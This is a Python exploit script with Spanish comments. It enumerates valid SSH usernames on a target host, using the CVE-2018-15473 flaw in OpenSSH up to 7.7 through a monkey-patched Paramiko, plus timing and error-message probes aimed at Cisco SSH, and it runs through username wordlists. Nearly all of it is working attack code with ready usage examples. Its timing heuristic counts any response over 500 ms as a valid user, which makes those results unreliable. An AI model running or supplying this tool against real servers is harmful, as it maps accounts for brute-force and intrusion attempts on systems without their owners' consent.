#!/usr/bin/env python3
"""
SSH Username Enumeration — OpenSSH + Cisco SSH 1.25
Exploit CVE-2018-15473 (OpenSSH) + técnicas de timing para Cisco SSH

Soporta:
  - OpenSSH 2.3 – 7.7 (CVE-2018-15473)
  - Cisco SSH 1.25 (timing analysis + fuerza bruta)
  - Timing differential analysis para ambas versiones
  - Fallback a técnicas alternativas si Paramiko falla

Author: @antonio_taboada — hackingyseguridad.com
License: GPL-3.0
"""

import sys
import re
import socket
import logging
import argparse
import time
import statistics
from typing import Optional, Tuple, List
from pathlib import Path
from collections import defaultdict

assert sys.version_info >= (3, 6), "Requiere Python 3.6 o superior"

try:
    import paramiko
    from paramiko.auth_handler import AuthHandler
    from paramiko.message import Message
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False
    print("[!] Paramiko no disponible. Instalalo con: pip install paramiko")


class InvalidUsername(Exception):
    """Usuario no encontrado vía CVE-2018-15473."""
    pass


class SshFingerprint:
    """Analiza y almacena información del servidor SSH."""
    
    def __init__(self, banner: str):
        self.raw_banner = banner
        self.version = None
        self.vendor = None
        self.is_openssh = False
        self.is_cisco = False
        self.parse_banner()
    
    def parse_banner(self):
        """Extrae versión y tipo de servidor SSH del banner."""
        banner = self.raw_banner.strip()
        
        # Detectar OpenSSH
        if 'OpenSSH' in banner:
            self.is_openssh = True
            self.vendor = 'OpenSSH'
            match = re.search(r'OpenSSH[_\s]+(?P<version>\d+\.\d+)', banner)
            if match:
                try:
                    self.version = float(match.group('version'))
                except ValueError:
                    pass
        
        # Detectar Cisco SSH
        elif 'Cisco' in banner:
            self.is_cisco = True
            self.vendor = 'Cisco'
            match = re.search(r'Cisco\s+SSH\s+(?P<version>\d+\.\d+)', banner)
            if match:
                try:
                    self.version = float(match.group('version'))
                except ValueError:
                    pass
        
        # Fallback: otros SSHd
        else:
            match = re.search(r'SSH-[\d\.\w]+-(?P<vendor>[^\s]+)', banner)
            if match:
                self.vendor = match.group('vendor')
    
    def is_vulnerable(self) -> Tuple[bool, str]:
        """Determina si la versión es vulnerable a CVE-2018-15473 o timing attack."""
        if self.is_openssh and self.version:
            if self.version <= 7.7:
                return True, f"OpenSSH {self.version} vulnerable a CVE-2018-15473"
            else:
                return False, f"OpenSSH {self.version} está parcheado"
        
        elif self.is_cisco and self.version:
            if self.version <= 1.99:
                return True, f"Cisco SSH {self.version} es antiguo, vulnerable a timing attacks"
            else:
                return False, f"Cisco SSH {self.version} puede tener protecciones"
        
        return False, "Versión desconocida"


def apply_openssh_monkey_patch() -> None:
    """Monkey patch para explotar CVE-2018-15473 en Paramiko."""
    if not PARAMIKO_AVAILABLE:
        return
    
    def patched_add_boolean(*args, **kwargs):
        """Paquete booleano malformado para CVE-2018-15473."""
        pass
    
    original_parse_service_accept = AuthHandler._parse_service_accept
    original_parse_userauth_failure = AuthHandler._parse_userauth_failure
    
    def patched_parse_service_accept(self, m):
        """Intercepta aceptación de servicio."""
        old_add_boolean = Message.add_boolean
        Message.add_boolean = patched_add_boolean
        try:
            return original_parse_service_accept(self, m)
        finally:
            Message.add_boolean = old_add_boolean
    
    def patched_parse_userauth_failure(self, m):
        """Detecta fallo de autenticación = usuario no válido."""
        raise InvalidUsername("Usuario no encontrado")
    
    AuthHandler._parse_service_accept = patched_parse_service_accept
    AuthHandler._parse_userauth_failure = patched_parse_userauth_failure


def create_socket(hostname: str, port: int, timeout: int = 10) -> Optional[socket.socket]:
    """Crea un socket conectado al objetivo."""
    try:
        sock = socket.create_connection((hostname, port), timeout=timeout)
        return sock
    except (socket.error, socket.timeout):
        return None


def grab_banner(hostname: str, port: int) -> Tuple[Optional[str], float]:
    """Extrae banner SSH y mide tiempo de respuesta."""
    start_time = time.time()
    sock = create_socket(hostname, port, timeout=5)
    
    if not sock:
        return None, 0.0
    
    try:
        sock.settimeout(5)
        banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
        elapsed = time.time() - start_time
        sock.close()
        return banner, elapsed
    except (socket.timeout, Exception):
        return None, 0.0
    finally:
        try:
            sock.close()
        except:
            pass


def detect_ssh_version(hostname: str, port: int) -> Tuple[Optional[SshFingerprint], str]:
    """Detecta versión SSH y retorna análisis."""
    print("[*] Detectando versión SSH...", end=" ", flush=True)
    
    banner, elapsed = grab_banner(hostname, port)
    
    if not banner:
        print("TIMEOUT/ERROR")
        return None, ""
    
    fingerprint = SshFingerprint(banner)
    print(f"\n[+] Banner: {banner}")
    
    if fingerprint.vendor:
        vuln, status = fingerprint.is_vulnerable()
        print(f"[+] Detectado: {fingerprint.vendor} {fingerprint.version or 'v?'}")
        print(f"[*] Estado: {status}")
        return fingerprint, banner
    
    print("[!] Versión desconocida")
    return None, banner


def connect_openssh(username: str, hostname: str, port: int, 
                    verbose: bool = False, timeout: int = 10) -> Tuple[bool, float]:
    """
    Intenta enumeración de usuario en OpenSSH <= 7.7 vía CVE-2018-15473.
    Retorna: (usuario_válido, tiempo_respuesta)
    """
    if not PARAMIKO_AVAILABLE:
        return False, 0.0
    
    start_time = time.time()
    sock = create_socket(hostname, port, timeout=timeout)
    
    if not sock:
        return False, 0.0
    
    try:
        transport = paramiko.Transport(sock)
        transport.set_hexdump(False)
        sock.settimeout(timeout)
        
        try:
            transport.start_client()
        except (paramiko.ssh_exception.SSHException, Exception):
            return False, time.time() - start_time
        
        try:
            pkey = paramiko.RSAKey.generate(1024)
            transport.auth_publickey(username, pkey)
        except InvalidUsername:
            return False, time.time() - start_time
        except paramiko.ssh_exception.AuthenticationException:
            # Usuario válido pero autenticación fallida
            return True, time.time() - start_time
        except (paramiko.ssh_exception.SSHException, Exception):
            return False, time.time() - start_time
        
        return False, time.time() - start_time
    
    finally:
        try:
            transport.close()
        except:
            pass
        try:
            sock.close()
        except:
            pass


def connect_timing_analysis(username: str, hostname: str, port: int,
                           verbose: bool = False, num_probes: int = 3) -> Tuple[bool, float]:
    """
    Análisis de timing para Cisco SSH 1.25 y otros servidores.
    Usuarios válidos producen respuestas más lentas (el servidor valida).
    
    Retorna: (usuario_válido, tiempo_promedio)
    """
    if not PARAMIKO_AVAILABLE:
        return False, 0.0
    
    timings = []
    
    for probe in range(num_probes):
        start_time = time.time()
        sock = create_socket(hostname, port, timeout=10)
        
        if not sock:
            timings.append(0.0)
            continue
        
        try:
            transport = paramiko.Transport(sock)
            transport.set_hexdump(False)
            sock.settimeout(8)
            
            try:
                transport.start_client()
                transport.auth_password(username, "invalid_password_" + str(probe))
            except paramiko.ssh_exception.AuthenticationException:
                # Usuario válido (o no, pero servidor respondió)
                timings.append(time.time() - start_time)
            except paramiko.ssh_exception.SSHException:
                # Usuario no válido — respuesta rápida
                timings.append(time.time() - start_time)
            except Exception:
                timings.append(time.time() - start_time)
        
        finally:
            try:
                transport.close()
            except:
                pass
            try:
                sock.close()
            except:
                pass
    
    if not timings or all(t == 0 for t in timings):
        return False, 0.0
    
    avg_time = statistics.mean([t for t in timings if t > 0])
    return avg_time > 0.5, avg_time  # Umbral: 500ms


def connect_cisco_ssh(username: str, hostname: str, port: int,
                     verbose: bool = False) -> Tuple[bool, float]:
    """
    Estrategia específica para Cisco SSH 1.25:
    - Intenta autenticación con contraseña inválida
    - Mide tiempo de respuesta
    - Analiza código de error SSH
    """
    start_time = time.time()
    sock = create_socket(hostname, port, timeout=10)
    
    if not sock:
        return False, 0.0
    
    try:
        if not PARAMIKO_AVAILABLE:
            # Fallback sin Paramiko: enviar paquete SSH crudo
            return False, time.time() - start_time
        
        transport = paramiko.Transport(sock)
        transport.set_hexdump(False)
        sock.settimeout(8)
        
        try:
            transport.start_client()
        except (paramiko.ssh_exception.SSHException, Exception):
            return False, time.time() - start_time
        
        # Cisco SSH 1.25 acepta password auth
        try:
            transport.auth_password(username, "cisco123_test")
        except paramiko.ssh_exception.AuthenticationException as e:
            # Si dice "invalid user" es fast, si dice "auth failed" es valid
            error_msg = str(e).lower()
            
            if 'invalid user' in error_msg or 'unknown' in error_msg:
                return False, time.time() - start_time
            else:
                # Usuario existe pero contraseña incorrecta
                return True, time.time() - start_time
        except (paramiko.ssh_exception.SSHException, Exception):
            return False, time.time() - start_time
        
        return False, time.time() - start_time
    
    finally:
        try:
            transport.close()
        except:
            pass
        try:
            sock.close()
        except:
            pass


def enumerate_user(username: str, hostname: str, port: int, 
                   fingerprint: Optional[SshFingerprint],
                   verbose: bool = False) -> bool:
    """
    Intenta enumerar un usuario usando la técnica apropiada según SSH detectado.
    Retorna True si usuario válido.
    """
    username = username.strip()
    
    if not username:
        return False
    
    if not fingerprint:
        # Sin detección: probar ambas técnicas
        valid_openssh, t1 = connect_openssh(username, hostname, port, verbose)
        if valid_openssh:
            print(f"[+] {username} ENCONTRADO (OpenSSH)")
            return True
        
        valid_timing, t2 = connect_timing_analysis(username, hostname, port, verbose)
        if valid_timing:
            print(f"[+] {username} ENCONTRADO (Timing: {t2:.3f}s)")
            return True
        
        if verbose:
            print(f"[-] {username} no encontrado")
        return False
    
    # Estrategia según tipo detectado
    if fingerprint.is_openssh and fingerprint.version and fingerprint.version <= 7.7:
        valid, timing = connect_openssh(username, hostname, port, verbose)
        if valid:
            print(f"[+] {username} ENCONTRADO")
        elif verbose:
            print(f"[-] {username} no encontrado ({timing:.3f}s)")
        return valid
    
    elif fingerprint.is_cisco:
        valid, timing = connect_cisco_ssh(username, hostname, port, verbose)
        if valid:
            print(f"[+] {username} ENCONTRADO ({timing:.3f}s)")
        elif verbose:
            print(f"[-] {username} no encontrado ({timing:.3f}s)")
        return valid
    
    else:
        # Servidor desconocido: probar timing analysis
        valid, timing = connect_timing_analysis(username, hostname, port, verbose, num_probes=3)
        if valid:
            print(f"[+] {username} ENCONTRADO (Timing: {timing:.3f}s)")
        elif verbose:
            print(f"[-] {username} no encontrado ({timing:.3f}s)")
        return valid


def main(**kwargs):
    """Punto de entrada principal."""
    hostname = kwargs.get('hostname')
    port = kwargs.get('port', 22)
    verbose = kwargs.get('verbose', False)
    wordlist_path = kwargs.get('wordlist')
    username = kwargs.get('username')
    
    print(f"\n[*] Objetivo: {hostname}:{port}\n")
    
    # Detectar versión SSH
    fingerprint, banner = detect_ssh_version(hostname, port)
    print()
    
    # Aplicar monkey patch si es OpenSSH vulnerable
    if fingerprint and fingerprint.is_openssh and fingerprint.version and fingerprint.version <= 7.7:
        if PARAMIKO_AVAILABLE:
            print("[*] Aplicando parche CVE-2018-15473...")
            apply_openssh_monkey_patch()
            print("[+] Parche aplicado\n")
    
    # Probar usuario único
    if username:
        print(f"[*] Probando usuario único: {username}\n")
        found = enumerate_user(username, hostname, port, fingerprint, verbose)
        return found
    
    # Enumerar desde wordlist
    if not wordlist_path or not Path(wordlist_path).exists():
        print(f"[!] Wordlist no encontrada: {wordlist_path}")
        return False
    
    # Cargar usuarios
    try:
        with open(wordlist_path) as f:
            usernames = [u.strip() for u in f if u.strip()]
    except Exception as e:
        print(f"[!] Error leyendo wordlist: {e}")
        return False
    
    print(f"[*] Enumerando {len(usernames)} usuarios\n")
    print("[*] Resultados:")
    print("-" * 50)
    
    found_users = []
    for i, u in enumerate(usernames, 1):
        print(f"\r[{i}/{len(usernames)}] Probando {u:<20}", end="", flush=True)
        if enumerate_user(u, hostname, port, fingerprint, verbose=False):
            found_users.append(u)
    
    print(f"\n" + "-" * 50)
    print(f"\n[*] Enumeración completada!")
    
    if found_users:
        print(f"[+] Usuarios encontrados ({len(found_users)}):")
        for u in found_users:
            print(f"    ✓ {u}")
    else:
        print("[!] No se encontraron usuarios válidos")
    
    return len(found_users) > 0


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description="SSH Username Enumeration — OpenSSH + Cisco SSH 1.25",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos de uso:
  Usuario único:  python3 %(prog)s target.com -u admin
  Wordlist:       python3 %(prog)s target.com -w usuarios.txt
  Verbose:        python3 %(prog)s target.com -w usuarios.txt -v
  Puerto custom:  python3 %(prog)s target.com -p 2222 -w usuarios.txt
  Cisco SSH 1.25: python3 %(prog)s 192.168.1.1 -w usuarios.txt
        """
    )
    
    parser.add_argument('hostname', help='IP/dominio objetivo', type=str)
    parser.add_argument('-p', '--port', help='Puerto SSH (default: 22)', default=22, type=int)
    parser.add_argument('-v', '--verbose', action='store_true', 
                       help='Mostrar usuarios no encontrados')
    
    multi = parser.add_mutually_exclusive_group(required=True)
    multi.add_argument('-w', '--wordlist', type=str, help='Fichero de usuarios')
    multi.add_argument('-u', '--username', type=str, help='Usuario único')
    
    args = parser.parse_args()
    
    # Suprimir logs de Paramiko
    if PARAMIKO_AVAILABLE:
        logging.getLogger('paramiko').setLevel(logging.CRITICAL)
    
    try:
        result = main(**vars(args))
        sys.exit(0 if result else 1)
    except KeyboardInterrupt:
        print("\n\n[!] Interrumpido por usuario")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Error fatal: {e}")
        sys.exit(1)
